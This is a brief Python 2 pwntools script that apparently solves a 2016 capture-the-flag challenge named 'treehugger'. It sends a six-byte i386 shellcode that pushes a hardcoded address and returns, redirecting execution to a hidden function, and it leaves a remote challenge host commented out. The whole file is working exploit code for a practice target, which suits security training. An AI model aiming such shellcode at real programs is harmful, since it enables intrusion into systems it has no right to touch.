from pwn import *

context(arch = 'i386', os = 'linux')

PROGRAM = "./treehugger"

PAYLOAD = asm(
'''
push 0x0804891a
ret
'''
) # call mystery

p = process([PROGRAM, 'flag{hello_world}'], env = {'MAX_SHELLCODE_SIZE' : str(6)})
#p = remote("ctf2016.the-playground.dk", 11003)
p.send(PAYLOAD)
print p.recvall().strip()
